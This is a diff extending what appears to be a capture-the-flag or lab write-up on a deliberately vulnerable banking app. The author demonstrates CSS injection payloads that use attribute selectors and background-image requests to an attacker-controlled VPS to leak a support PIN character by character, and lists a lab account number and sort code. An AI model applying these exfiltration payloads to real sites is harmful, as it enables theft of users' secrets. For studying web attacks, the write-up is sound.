@@ -463,3 +463,20 @@ This is definately along the right lines so just some further notes of successes
 
 - ```value=black; } div#supportModal input[name="pin_1"] { background-image: url('http://x.x.x.x:8081/hello');}``` ok the support modal is obviously visibile to the user after a transfer. But I haven't seen anywhere the support pin can be used.
 - ```value=black; } html body div.container div.row div.col-md-10.col-md-offset-1 div.panel.panel-default div.panel-heading div strong{ background-image: url('http://x.x.x.x:8081/hello');}``` so this is the selector to the strong elements of the page which are wrapped around the account name, sort code and account number. But CSS can't get the content of these.
+
+I do however have the account number and sort code, which I can use on the login-help page. Lets try that! Using the following
+
+- Account Number 36573849
+- Sort code 013394
+
+![alt](./images/vulnbanking-08.png)
+
+Ahhh there we go there's the use for the support pin! Right so I can use the same technique with an adjusted selector to get the value of each part of the pin. For example
+
+```value=black; } div#supportModal input[name="pin_1"][value="g"] { background-image: url('http://x.x.x.x:8081/valid');}```
+
+Works, whereas
+
+```value=black; } div#supportModal input[name="pin_1"][value="a"] { background-image: url('http://x.x.x.x:8081/valid');}```
+
+Gives no interaction with the VPS.
